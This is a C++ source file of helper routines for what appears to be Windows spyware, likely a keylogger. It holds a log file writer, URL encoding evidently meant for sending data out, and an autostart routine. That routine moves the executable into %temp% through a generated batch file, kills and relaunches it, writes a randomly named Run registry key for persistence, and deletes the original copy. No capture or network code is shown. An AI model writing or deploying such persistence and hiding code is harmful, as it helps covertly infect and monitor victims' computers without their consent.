#include "headers.hpp"

const string LOGFILENAME = "data.th";
const int SENDING_FREQUENCY = 1;

string GetTime() {
    time_t now = time(0);
    tm* gmtm = gmtime(&now);
    string s = asctime(gmtm);
    return s;
}

string url_encode(string value) {
	for (int i = 0; i < value.size(); i++)
		if (value[i] < 32 || value[i]>127)value[i] = '0';

	ostringstream escaped;
	escaped.fill('0');
	escaped << hex;

	for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
		string::value_type c = (*i);
		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
			escaped << c;
			continue;
		}
		escaped << uppercase;
		escaped << '%' << setw(2) << int((unsigned char)c);
		escaped << nouppercase;
	}

	return escaped.str();
}

void LOG(string input) {
	fstream LogFile;
	LogFile.open(LOGFILENAME, fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

string random_string(int lenght) {
	srand(time(0));
	string random = "";
	while (lenght--) {
		char ran = rand() % 25 + 97;
		random += ran;
	}
	return random;
}

string get_exe() {
	//https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
	TCHAR buffer[MAX_PATH] = { 0 };
	TCHAR* out;
	DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
	GetModuleFileName(NULL, buffer, bufSize);
	out = PathFindFileName(buffer);
	return out;
}

bool filexits(const string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

void autostart() {
	string path;
	char username[256 + 1];
	DWORD username_len = 256 + 1;
	GetUserName(username, &username_len);
	cout << username<<endl;
	char letter[256 + 1];
	GetSystemDirectory(letter, sizeof(letter));

	path = letter[0];
	path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
	if (filexits(path + "\\" + get_exe())==false) {
		fstream file;
		file.open("o.bat", ios::out);
		file << "TASKKILL /F /IM " << get_exe() << endl
			<< "move " << get_exe() << " %temp%" << endl
			<< "move " << "shitoo" << " %temp%" << endl
			<< "start %temp%\\" + get_exe();
		file.close();
		string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
		system(cmd.c_str());

		char buffer[MAX_PATH];
		::GetModuleFileNameA(NULL, buffer, MAX_PATH);
		string buff2(buffer);
		buff2.erase(buff2.size() - get_exe().size(), 256);
		file.open("shitoo", ios::out);
		file << buff2 + "o.bat";
		file.close();
		system("o.bat");
	}
	if (filexits(path + "\\shitoo")) {
		fstream file;
		string path2;
		file.open(path + "\\shitoo", ios::in);
		file >> path2;
		file.close();
		remove(path2.c_str());
		remove("shitoo");
	}
}
